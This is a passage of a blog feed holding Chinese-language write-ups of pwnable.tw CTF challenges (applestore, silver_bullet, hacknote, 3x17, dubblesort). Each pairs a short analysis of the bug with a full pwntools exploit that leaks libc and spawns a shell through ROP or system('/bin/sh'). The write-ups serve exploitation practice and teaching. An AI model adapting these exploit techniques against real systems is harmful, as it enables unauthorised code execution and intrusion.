ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10104</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/applestore&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">num</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Device Number&gt; &quot;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">temp</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Item Number&gt; &quot;</span>, temp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cart</span>(<span class="params">temp</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>, temp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkout</span>():</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got.atoi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        add(<span class="number">2</span>)</span><br><span class="line">    checkout()</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;y\x00&#x27;</span> + p32(atoi_got) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    cart(pd)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;27: &quot;</span>)</span><br><span class="line">    atoi_got_true = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = atoi_got_true - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    environ_libc = libc_base + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;y\x00&#x27;</span> + p32(environ_libc) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    cart(pd)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;27: &quot;</span>)</span><br><span class="line">    stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;27&#x27;</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x12345678</span>)</span><br><span class="line">    pd += p32(atoi_got + <span class="number">0x22</span>) + p32(stack - <span class="number">0x104</span> - <span class="number">0x8</span>) </span><br><span class="line">    delete(pd)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, p32(system) + <span class="string">b&quot;||/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/01/29/pwnable-applestore/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwnable-silver_bullet</title>
      <link>http://example.com/2024/01/27/pwnable-silver-bullet/</link>
      <guid>http://example.com/2024/01/27/pwnable-silver-bullet/</guid>
      <pubDate>Sat, 27 Jan 2024 05:50:58 GMT</pubDate>
      
      <description>&lt;p&gt;读入的字符串s在ebp-0x34的位置，储存长度的地址为ebp-0x4&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>读入的字符串s在ebp-0x34的位置，储存长度的地址为ebp-0x4</p><span id="more"></span><p><img src="/imgs/$%7Bfiilename%7D/pwnable-silver_bullet-1.png" alt="pwnable-silver_bullet-1"></p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-silver_bullet-2.png" alt="pwnable-silver_bullet-2"></p><p>利用strncat会在字符串尾加\x00，这个字节造成溢出，可以利用这个点覆盖字符串长度</p><p>思路：先create一个0x2f长度的字符串，再power一个字节，那么储存的长度0x2f会因为strncat覆盖成\x00，之后power函数中还会对power输入的字节进行重新统计，那么最终储存的长度就会变成0 + 1 &#x3D; 1，所以我们又可以在已经输入的字符串后面添加0x30-1个字符，这就造成了溢出，利用这个溢出，我们就可以修改字符串的长度，并写上rop，然后就可以打败Gin，执行我们的rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10103</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/silver_bullet&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc_32.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Give me your description of bullet :&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">power</span>(<span class="params">data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;bullet :&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">beat</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    create(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2f</span>)</span><br><span class="line">    power(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    power(<span class="string">b&#x27;\xff&#x27;</span> * <span class="number">3</span> + p32(<span class="number">0xdeadbeef</span>)+p32(elf.plt.puts)+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(elf.got.puts))</span><br><span class="line">    beat()</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Oh ! You win !!\n&#x27;</span>)</span><br><span class="line">    puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;puts_addr:&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    create(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2f</span>)</span><br><span class="line">    power(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    power(<span class="string">b&#x27;\xff&#x27;</span> * <span class="number">3</span> + p32(<span class="number">0xdeadbeef</span>)+p32(system)+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(bin_sh))</span><br><span class="line">    beat()</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/01/27/pwnable-silver-bullet/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwnable-hacknote</title>
      <link>http://example.com/2024/01/27/pwnable-hacknote/</link>
      <guid>http://example.com/2024/01/27/pwnable-hacknote/</guid>
      <pubDate>Sat, 27 Jan 2024 04:54:03 GMT</pubDate>
      
      <description>&lt;p&gt;一道UAF漏洞基础题&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>一道UAF漏洞基础题</p><span id="more"></span><p>两个结构体，note和chunk</p><p>note大小为8bits</p><p>chunk是我们自己申请的大小</p><p>思路：先申请两个较大的chunk，此时我们有note0、note1、chunk0、chunk1</p><p>释放后fastbin中有四个chunk</p><p>此时我们若申请一个大小为8的chunk，那么note2会指向note0，chunk2会指向note1，为什么？因为malloc在申请内存时会优先申请最近释放的内存，且因为note0和note1大小为8，刚好符合我们申请的note2和chunk2，而chunk0和chunk1比较大，所以会优先申请note0和note1原来的内存</p><p>那我们就可以利用这个点，先泄露puts地址算出libc基址，然后getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc_32.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">32</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">    add(<span class="number">32</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    payload = p32(<span class="number">0x804862b</span>)+p32(<span class="number">0x804A018</span>)</span><br><span class="line">    add(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    payload = p32(system_addr) + <span class="string">b&#x27;;sh\x00&#x27;</span></span><br><span class="line">    add(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/01/27/pwnable-hacknote/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwnable-3x17</title>
      <link>http://example.com/2024/01/26/pwnable-3x17/</link>
      <guid>http://example.com/2024/01/26/pwnable-3x17/</guid>
      <pubDate>Fri, 26 Jan 2024 10:52:51 GMT</pubDate>
      
      <description>&lt;p&gt;第一反应有点像之前做过的一道fmt漏洞，通过修改fini.array地址内容为mian地址达到无限次循环，这个题省略了fmt漏洞，让你可以直接修改地址内容，根据程序执行流程图，main函数执行完后会执行fini.array&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>第一反应有点像之前做过的一道fmt漏洞，通过修改fini.array地址内容为mian地址达到无限次循环，这个题省略了fmt漏洞，让你可以直接修改地址内容，根据程序执行流程图，main函数执行完后会执行fini.array</p><span id="more"></span><p>那么程序流程为</p><p>__libc_csu_init -&gt; .init_array -&gt;main -&gt; __libc_csu_fini  -&gt; .fini_array[1] -&gt;.fini_array[0]  </p><p>如果将fini_array[1]覆盖为main</p><p>fini_array[0]覆盖为__libc_csu_fini，那么就完成了无限循环</p><p>补充一点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在执行init.array时会依次调用</span><br><span class="line">.init_array[0] </span><br><span class="line">.init_array[1]</span><br><span class="line">...</span><br><span class="line">.init_array[n]</span><br><span class="line"></span><br><span class="line">而fini.array则是相反</span><br><span class="line">.fini_array[n] </span><br><span class="line">.fini_array[n-1] </span><br><span class="line">... </span><br><span class="line">.fini_array[0]</span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/pwnable-3x17-1.jpg" alt="pwnable-3x17-1"></p><p>但是程序中有一个点要注意一下，每次byte_4B9330都会自增1，且当byte_4B9330为1的时候才可以写，不过问题不大，因为unsigned_int8的范围是0~255，只用循环多次就能回到1</p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-3x17-2.png" alt="pwnable-3x17-2"></p><p>然后就是ret2syscall，最后要用leave ret执行shellcode</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">pop_rdi =<span class="number">0x401696</span></span><br><span class="line">pop_rsi =<span class="number">0x406c30</span></span><br><span class="line">pop_rdx =<span class="number">0x446e35</span></span><br><span class="line">leave_ret =<span class="number">0x401c4b</span></span><br><span class="line">ret =<span class="number">0x401016</span></span><br><span class="line">mian_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_array =<span class="number">0x4B40F0</span></span><br><span class="line">fini =<span class="number">0x402960</span></span><br><span class="line">syscall =<span class="number">0x4022b4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ropchain</span>(<span class="params">addr,data</span>):</span><br><span class="line">    p.sendafter(<span class="string">b&quot;addr:&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    ropchain(fini_array,p64(fini)+p64(mian_addr))</span><br><span class="line">    ropchain(<span class="number">0x4b92e0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#bss</span></span><br><span class="line">    ropchain(fini_array+<span class="number">0x10</span>,p64(pop_rax)+p64(<span class="number">59</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x20</span>,p64(pop_rdi)+p64(<span class="number">0x4b92e0</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x30</span>,p64(pop_rsi)+p64(<span class="number">0</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x40</span>,p64(pop_rdx)+p64(<span class="number">0</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x50</span>,p64(syscall))</span><br><span class="line">    ropchain(fini_array,p64(leave_ret)+p64(ret))</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/01/26/pwnable-3x17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwnable-dubblesort</title>
      <link>http://example.com/2024/01/25/pwnable-dubblesort/</link>
      <guid>http://example.com/2024/01/25/pwnable-dubblesort/</guid>
      <pubDate>Thu, 25 Jan 2024 14:19:54 GMT</pubDate>
      
      <description>&lt;p&gt;连接题目后，发现输入字符后会带出一些不可见字符，再分析源码，是因为程序没有将缓冲区清空导致的，所以栈内可能会存在一些有用的数据&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>连接题目后，发现输入字符后会带出一些不可见字符，再分析源码，是因为程序没有将缓冲区清空导致的，所以栈内可能会存在一些有用的数据</p><span id="more"></span><p><img src="/imgs/$%7Bfiilename%7D/pwnable-dubblesort-3.png"></p><p>经过调试，发现栈内存在libc中的地址</p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-dubblesort-1.png" alt="pwnable-dubblesort-1"></p><p>偏移为 0x1b0000</p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-dubblesort-2.png" alt="pwnable-dubblesort-2"></p><p>带出libc基址后就是ret2libc了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/dubblesort&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc_32.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/dubblesort&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc_32.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x001b0000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;What your name :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">    libc_base = u32(p.recv(<span class="number">4</span>))- offset -<span class="number">0xa</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span 